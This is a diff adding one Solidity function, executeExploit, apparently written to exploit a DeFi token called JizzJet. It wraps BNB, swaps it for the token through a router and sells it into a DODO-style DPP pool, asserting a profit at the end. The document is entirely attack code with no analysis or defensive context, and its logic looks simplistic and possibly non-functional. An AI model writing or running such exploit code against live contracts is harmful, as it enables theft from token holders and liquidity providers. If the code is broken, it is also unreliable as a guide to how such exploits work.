@@ -1,0 +1,29 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Start the exploit by getting WBNB and setting up its parameters
+    IWETH(uniswapRouter.WETH()).deposit{value: amount}();
+    assert(IWETH(uniswapRouter.WETH()).balanceOf(address(this)) >= amount);
+
+    // Step 2: Prepare to swap WBNB for JizzJet tokens using the pancake router
+    address[] memory path = new address[](2);
+    path[0] = uniswapRouter.WETH();
+    path[1] = address(target);
+
+    // Step 3: Perform the swap to get JizzJet tokens
+    uniswapRouter.swapExactETHForTokensSupportingFeeOnTransferTokens(0, path, address(this), block.timestamp + 300);
+
+    // Step 4: Now, we will execute the sell function on the DPP contract using our JizzJet Tokens
+    uint256 jizzJetBalance = IERC20(target).balanceOf(address(this));
+    require(jizzJetBalance > 0, "No JizzJet tokens acquired");
+    
+    // Transfer all JizzJet tokens to DPP contract, this will initiate the sell process
+    IERC20(target).approve(address(flashloanProvider), jizzJetBalance);
+    IDPP(flashloanProvider).sellBase(address(this));
+
+    // Finally: Check and collect our profit as WBNB
+    uint256 balanceAfter = IWETH(uniswapRouter.WETH()).balanceOf(address(this));
+    assert(balanceAfter > amount);
+}
+</executeExploitCode>
+```
